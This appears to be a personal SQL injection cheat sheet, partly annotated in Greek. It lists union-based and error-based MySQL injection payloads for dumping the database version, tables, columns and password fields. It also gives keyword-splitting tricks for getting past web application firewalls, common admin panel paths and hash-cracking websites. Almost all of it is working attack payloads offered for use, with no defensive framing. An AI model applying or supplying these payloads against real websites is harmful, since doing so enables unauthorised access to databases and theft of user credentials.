Union/Normal

Order by x #
- union select x,x1 #
@@version,version()
concat(database()),group_concat(database())
group_concat(table_name,0x0a)
from information_schema.tables where table_schema=database() #
http://www.swingnote.com/tools/texttohex.php
group_concat(x(something else), 0x3a,x1(pass),0x0a) from x #


// string based

Το ίδιο με το αποπάνω αλλά χρησιμοποιούμε ' στην αρχή
και στο τέλος +.


// Error based

or 1 group by concat_ws(0x3a,version(),floor(rand(0)*2)) having min(0) or 1 #
//
and (select 1 from (select count(*),concat((select(select concat(cast(database() as char),0x7e))
from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x
from information_schema.tables group by x)a)
//
and (select 1 from (select count(*),concat((select(select concat(cast(table_name as char),0x7e))
from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x
from information_schema.tables group by x)a)
//
and (select 1 from (select count(*),concat((select(select concat(cast(column_name as char),0x7e))
from information_schema.columns where table_name=0x... limit 0,1),floor(rand(0)*2))x
from information_schema.tables group by x)a)
//
and (select 1 from (select+count(*),concat((select(select concat(cast(concat(column_name,0x7e,column_name) as char),0x7e))
from table_name limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)

Αν το παραπάνω δίνει error:
"Subquery returns more than 1 row" η κάτι διαφορέτικο πρέπει να χρησιμοποιήσω
το παρακάτω.

and (select 1 from (select count(*),concat((select(select concat(cast(concat(substring(Column_name,1,1)) as char),0x7e))
from table_name limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)

// Waf Bypass

/*!union*/ select
UNIunionON SELselectECT
uni>on sel>ect
union selECT
/*!union*/ /*selECT*/


Admin Panels :
/admin/
/admin.html
:2082/
/admin.php
/login.php
/login.html

Decrypters/Encrypters:
https://gchq.github.io/CyberChef/
https://md5decrypt.net/en/
